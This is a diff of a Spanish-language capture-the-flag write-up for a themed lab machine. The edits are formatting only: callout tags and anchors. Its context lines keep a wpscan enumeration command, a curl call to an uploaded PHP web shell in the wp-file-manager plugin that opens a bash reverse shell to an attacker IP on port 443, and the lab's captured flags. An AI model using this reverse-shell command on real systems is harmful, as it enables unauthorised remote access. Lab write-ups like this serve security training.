@@ -152,7 +152,7 @@ wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp
     curl -X GET "http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.16.217.128/443+0>%261'"
     ```
     
-> [!TIP]
+> [!tip]
 > El carácter `&` se codifica como `%26` en las URLs para evitar problemas de interpretación.
 
 
@@ -282,11 +282,11 @@ wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp
 
 ## Bandera(s)
 
-> [!FLAG] `flag{hagrid98}`
+> [!flag] `flag{hagrid98}`
 > 1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
-^bandera
+^bandera-user
 
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > 2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
-^bandera
+^bandera-root
